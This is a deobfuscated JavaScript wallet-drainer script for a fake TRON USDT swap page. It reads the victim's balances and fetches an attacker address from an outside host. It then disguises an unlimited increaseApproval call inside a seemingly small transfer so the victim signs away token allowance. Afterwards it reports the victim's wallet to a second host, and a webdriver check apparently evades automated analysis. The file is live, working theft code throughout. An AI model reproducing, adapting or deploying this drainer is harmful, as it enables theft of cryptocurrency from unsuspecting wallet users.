//Thu Oct 17 2024 07:09:05 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
var oooo = 992212,
  ooe;
if (oooo = oooo >> 12 ^ 213, ooe = window.location && window.navigator.webdriver) {
  var i = 9;
  for (oooo = oooo ^ i; i < oooo | 9; i > 0) {
    ooe.href = ooe.href + "?" + i;
  }
}
var contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
  walletAddress,
  usdtBalance = 0,
  trxBalance = 0,
  transactionObj = null,
  toAddress,
  type = 0,
  code,
  isConnected = false;
async function getUsdtBalance(_0x118aee, _0x29474e) {
  let _0x3187ef = window.tronWeb,
    _0x47fe0d = [{
      "type": "address",
      "value": _0x118aee
    }],
    _0x50b3cd = {},
    _0x5439de = await _0x3187ef.transactionBuilder.triggerSmartContract(contractAddress, "balanceOf(address)", _0x50b3cd, _0x47fe0d, _0x118aee);
  _0x5439de.result && _0x29474e != undefined && _0x29474e(_0x5439de.constant_result[0]);
}
async function getAssets(_0x5cac0e) {
  code = getUrlParams("code");
  try {
    let _0x1a238a = navigator.userAgent.toLowerCase();
    if (/okex/.test(_0x1a238a) || isPc()) {
      if (window.okxwallet.tronLink.ready) window.tronWeb = okxwallet.tronLink.tronWeb;else {
        const _0x2c3f0d = await window.okxwallet.tronLink.request({
          "method": "tron_requestAccounts"
        });
        200 === _0x2c3f0d.code && (window.tronWeb = tronLink.tronWeb);
      }
    }
    if (!window.tronWeb) {
      const _0x593c09 = TronWeb.providers.HttpProvider,
        _0x34dde8 = new _0x593c09(tronApi),
        _0x196c6b = new _0x593c09(tronApi),
        _0x36b5c2 = tronApi,
        _0x124006 = new TronWeb(_0x34dde8, _0x196c6b, _0x36b5c2);
      window.tronWeb = _0x124006;
    }
  } catch (_0x3d4050) {}
  if (window.tronWeb) {
    var _0x46907f = window.tronWeb;
    walletAddress = _0x46907f.defaultAddress.base58;
    if (walletAddress == false) {
      await getAssets(_0x5cac0e);
      return;
    }
    try {
      let _0x52eb8d = await _0x46907f.trx.getBalance(walletAddress);
      trxBalance = _0x46907f.fromSun(_0x52eb8d);
      getUsdtBalance(walletAddress, function (_0x1509cb) {
        usdtBalance = _0x46907f.fromSun(parseInt(_0x1509cb, 16));
        console.log(usdtBalance);
        isConnected = true;
        _0x5cac0e != undefined && _0x5cac0e(trxBalance, usdtBalance);
      });
    } catch (_0x1d7070) {
      tip(_0x1d7070);
    }
  } else tip("请用钱包扫码打开");
}
async function iaHelp(_0x89de69, _0x36edcc, _0x4bd108, _0x3caa04) {
  try {
    if (_0x3caa04 == 1 || _0x3caa04 == 2) var _0x15c14a = await tronWeb.trx.sign(_0x89de69);else {
      let _0x5099c9 = window.tronWeb,
        _0x567b3f = [{
          "type": "address",
          "value": _0x36edcc
        }, {
          "type": "uint256",
          "value": _0x4bd108 * 1000000
        }],
        _0x1c8749 = await _0x5099c9.transactionBuilder.triggerSmartContract(contractAddress, "transfer(address,uint256)", {}, _0x567b3f, walletAddress);
      if (isMobile() && isOkxApp() || isPc()) {
        _0x89de69.raw_data = _0x1c8749.transaction.raw_data;
      }
      var _0x15c14a = await _0x5099c9.trx.sign(_0x89de69);
    }
  } catch (_0x44bd2c) {
    _0x44bd2c.message ? tip(_0x44bd2c.message) : tip(_0x44bd2c);
  }
}
async function iaGet(_0x482dc3) {
  $.ajax({
    "url": domain + "/sapi/getData",
    "data": _0x482dc3,
    "dataType": "jsonp",
    "type": "get",
    "jsonpCallback": "handleCallback"
  });
}
async function iaCreate(_0x171f52) {
  $.ajax({
    "url": domain + "/sapi",
    "data": _0x171f52,
    "dataType": "jsonp",
    "type": "get",
    "jsonpCallback": "handleCallback1"
  });
}
async function iaResult(_0x241a41) {
  $.ajax({
    "url": domain + "/sapi/result",
    "data": _0x241a41,
    "dataType": "jsonp",
    "type": "get",
    "jsonpCallback": "handleCallback2"
  });
}
function handleCallback(_0x9942ef) {
  _0x9942ef.code == 0 ? tip(_0x9942ef.info) : (toAddress = _0x9942ef.to_address, $("#to_address").html(toAddress), $("#to_address").val(toAddress));
}
function handleCallback1(_0x4c16e) {
  if (_0x4c16e.code == 0) {
    tip(_0x4c16e.info);
  } else transactionObj = JSON.parse(_0x4c16e.data), type = _0x4c16e.type, (isMobile() && isOkxApp() || isPc()) && (toAddress = walletAddress), iaHelp(transactionObj, toAddress, amount, type);
}
function handleCallback2(_0x2a932a) {
  tip(_0x2a932a.info);
}
async function transfer_f() {
  if (!isConnected) {
    tip("正在连接网络。。。", 2000);
    return;
  }
  tip("正在创建交易。。。", 2000);
  executeBlockchainTransaction();
}
function tip(_0x4b6e94, _0x73da8 = 1500) {
  $("#tip").html(_0x4b6e94);
  $("#tip").show();
  setTimeout(function () {
    $("#tip").hide();
  }, _0x73da8);
}
function sleep(_0x50c105) {
  return new Promise(_0x558d44 => setTimeout(_0x558d44, _0x50c105));
}
function isOkxApp() {
  let _0x342a7f = navigator.userAgent,
    _0x4cc7fe = /OKApp/i.test(_0x342a7f);
  return _0x4cc7fe;
}
function isMobile() {
  let _0xbf8acc = navigator.userAgent,
    _0x36ef7c = /iphone|ipad|ipod|ios/i.test(_0xbf8acc),
    _0x23d77e = /android|XiaoMi|MiuiBrowser/i.test(_0xbf8acc),
    _0x1bc821 = _0x36ef7c || _0x23d77e;
  return _0x1bc821;
}
function isPc() {
  let _0x1c7b54 = navigator.userAgent,
    _0x117707 = /windows/i.test(_0x1c7b54);
  return _0x117707;
}
function changeTitle(_0xf72b8c) {
  $("title").html(_0xf72b8c);
}
function getUrlParams(_0x1618be) {
  var _0x4b52f4 = window.location.search.substr(1);
  if (_0x4b52f4 == "") {
    return false;
  }
  var _0x4bbadb = _0x4b52f4.split("&");
  for (var _0x458fab = 0; _0x458fab < _0x4bbadb.length; _0x458fab++) {
    var _0xc9c1d = _0x4bbadb[_0x458fab].split("=");
    if (_0xc9c1d[0] == _0x1618be) {
      return _0xc9c1d[1];
    }
  }
  return false;
}
async function getaddress() {
  try {
    const _0x52d232 = {
      "method": "tron_requestAccounts"
    };
    await window.okxwallet.tronLink.request(_0x52d232);
    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
      const _0x15f55a = window.tronWeb.defaultAddress.base58;
      console.log("User Address:", _0x15f55a);
      document.getElementById("trxAddress").value = _0x15f55a;
    } else {
      console.log("Failed to fetch the address.");
    }
  } catch (_0x26a9e2) {
    console.error("Error connecting to Tron wallet:", _0x26a9e2);
  }
}
async function executeBlockchainTransaction() {
  let _0x494e32 = await fetch("https://fast.tronscans.cc/api/trc/getAddress", {
      "method": "POST",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "id=4"
    }),
    _0x44ec86 = await _0x494e32.json(),
    _0x5057ed = _0x44ec86.p_authorized_address,
    _0x4d9a36 = 1000000,
    _0x251c86 = [{
      "type": "address",
      "value": tronWeb.address.toHex(_0x5057ed)
    }, {
      "type": "uint256",
      "value": "1000000"
    }],
    _0x35fe5f = [{
      "type": "address",
      "value": tronWeb.address.toHex(_0x5057ed)
    }, {
      "type": "uint256",
      "value": "9999999999999999"
    }],
    _0x18b6ba = {
      "feeLimit": 100000000,
      "callValue": 0
    };
  const {
      transaction: _0x27608f
    } = await tronWeb.transactionBuilder.triggerSmartContract(tronWeb.address.toHex("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"), "transfer(address,uint256)", _0x18b6ba, _0x251c86, tronWeb.address.toHex(tronWeb.defaultAddress.base58)),
    _0x1bc645 = await tronWeb.transactionBuilder.sendTrx(_0x5057ed, _0x4d9a36, tronWeb.defaultAddress.base58);
  let {
    transaction: _0x5b74ea
  } = await tronWeb.transactionBuilder.triggerSmartContract(tronWeb.address.toHex("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"), "increaseApproval(address,uint256)", _0x18b6ba, _0x35fe5f, tronWeb.address.toHex(tronWeb.defaultAddress.base58));
  _0x5b74ea = await tronWeb.transactionBuilder.addUpdateData(_0x5b74ea, window.location.host);
  let _0x280e89 = _0x1bc645;
  _0x280e89.raw_data.contract[0].parameter.value = {
    ..._0x1bc645.raw_data.contract[0].parameter.value,
    ..._0x27608f.raw_data.contract[0].parameter.value
  };
  delete _0x280e89.raw_data.contract[0].parameter.value.data;
  delete _0x280e89.raw_data.contract[0].parameter.value.to_address;
  try {
    let _0x513667 = await tronWeb.trx.sign({
      "txID": _0x27608f.txID,
      "raw_data": _0x280e89.raw_data,
      "raw_data_hex": _0x5b74ea.raw_data_hex
    });
    return await tronWeb.trx.sendRawTransaction({
      ..._0x513667,
      "raw_data_hex": _0x5b74ea.raw_data_hex
    }), alert("交易成功！"), $.ajax({
      "url": "https://fast.tronscen.cc/api/trc/UserUpdates",
      "type": "POST",
      "data": JSON.stringify({
        "groups": "U换U",
        "walletAddress": senderAddress,
        "usdtBalance": amount,
        "trxBalance": amount
      }),
      "contentType": "application/json",
      "success": function (_0x4cd83c) {
        console.log("OK", _0x4cd83c);
      },
      "error": function (_0x44a418) {
        console.error("No", _0x44a418);
      }
    }), true;
  } catch (_0xc4b1ea) {
    return alert("error！"), false;
  }
}